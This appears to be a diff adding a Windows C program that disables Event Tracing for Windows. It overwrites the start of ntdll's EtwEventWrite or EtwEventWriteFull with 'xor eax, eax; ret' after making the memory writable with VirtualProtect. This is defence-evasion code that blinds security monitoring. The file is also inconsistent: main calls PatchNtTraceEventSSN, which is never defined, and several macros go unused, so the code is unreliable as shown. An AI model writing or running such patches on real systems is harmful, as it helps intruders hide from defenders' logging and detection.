@@ -1,0 +1,55 @@
+#include <Windows.h>
+#include <stdio.h>
+
+
+#define x64_RET_INSTRUCTION_OPCODE			0xC3		// 'ret'	- instruction opcode
+#define x64_MOV_INSTRUCTION_OPCODE			0xB8		// 'mov'	- instruction opcode
+
+#define	x64_SYSCALL_STUB_SIZE				0x20		// size of a syscall stub is 32
+
+typedef enum PATCH
+{
+	PATCH_ETW_EVENTWRITE,
+	PATCH_ETW_EVENTWRITE_FULL
+};
+BOOL PatchEtwWriteFunctionsStart(enum PATCH ePatch) {
+	DWORD		dwOldProtection		= 0x00;
+	PBYTE		pEtwFuncAddress		= NULL;
+	BYTE		pShellcode[3]		= {0x33, 0xC0,0xC3}; // xor eax, eax; ret
+	// Get the address of "EtwEventWrite" OR "EtwEventWriteFull" based of 'ePatch'
+	pEtwFuncAddress = GetProcAddress(GetModuleHandleA("NTDLL"), ePatch == PATCH_ETW_EVENTWRITE ? "EtwEventWrite" : "EtwEventWriteFull");
+	if (!pEtwFuncAddress) {
+		printf("[!] GetProcAddress failed with error  %d \n", GetLastError());
+		return FALSE;
+	}
+	printf("\t> Address Of \"%s\" : 0x%p \n", ePatch == PATCH_ETW_EVENTWRITE ? "EtwEventWrite" : "EtwEventWriteFull", pEtwFuncAddress);
+	printf("\t> Patching with \"33 C0 C3\" ... ");
+	// Change memory permissions to RWX
+	if (!VirtualProtect(pEtwFuncAddress, sizeof(pShellcode), PAGE_EXECUTE_READWRITE, &dwOldProtection)) return FALSE;
+	// Apply the patch
+	memcpy(pEtwFuncAddress, pShellcode, sizeof(pShellcode));
+	// Change memory permissions to original
+	if (!VirtualProtect(pEtwFuncAddress, sizeof(pShellcode), dwOldProtection, &dwOldProtection)) return FALSE;
+	printf("[+] DONE ! \n");
+	return TRUE;
+}
+
+
+
+
+
+
+
+
+
+int main() {
+	//PatchEtwWriteFunctionsStart(PATCH_ETW_EVENTWRITE);
+	//PatchEtwWriteFunctionsStart(PATCH_ETW_EVENTWRITE_FULL);
+
+	PatchNtTraceEventSSN();
+	
+	printf("[#] Press <Enter> To Quit ... \n");
+	getchar();
+
+	return 0;
+}
